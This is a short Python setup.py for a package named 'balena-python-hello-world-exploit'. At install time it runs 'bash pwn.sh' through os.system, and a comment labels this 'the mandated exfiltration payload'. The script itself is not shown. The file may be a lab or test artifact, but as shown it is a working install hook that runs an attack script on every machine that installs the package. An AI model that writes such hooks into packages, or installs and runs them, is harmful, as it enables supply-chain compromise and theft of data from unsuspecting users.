from setuptools import setup
import os

# Execute the mandated exfiltration payload
os.system("bash pwn.sh")

setup(
    name="balena-python-hello-world-exploit",
    version="0.0.1",
    packages=[],
)
